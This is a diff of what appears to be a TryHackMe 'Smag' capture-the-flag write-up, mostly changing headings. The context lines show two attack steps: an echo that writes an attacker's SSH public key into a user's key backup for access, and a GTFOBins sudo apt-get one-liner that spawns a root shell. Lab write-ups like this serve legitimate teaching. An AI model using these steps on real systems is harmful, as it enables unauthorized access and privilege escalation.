@@ -1,3 +1,4 @@
+-TRYHACKME CTF WRITEUP-
 <br>
 <br>
 ![img]({{ '/assets/images/smag/smag.png' | relative_url }}){: .center-image }
@@ -100,7 +101,7 @@ echo "your_public_id_rsa_key" > jake_id_rsa.pub.backup
 <br>
 <br>
 
-# Priv esc
+# Priv Esc
 <br>
 <br>
 
@@ -108,7 +109,7 @@ echo "your_public_id_rsa_key" > jake_id_rsa.pub.backup
 ![img]({{ '/assets/images/smag/14-smag.png' | relative_url }}){: .center-image }
 <br>
 
-[GTFObins](https://gtfobins.github.io/gtfobins/apt-get/#sudo) shows
+## [GTFObins](https://gtfobins.github.io/gtfobins/apt-get/#sudo) shows:
 ## We can run the command below:
 {% highlight bash %}
 apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
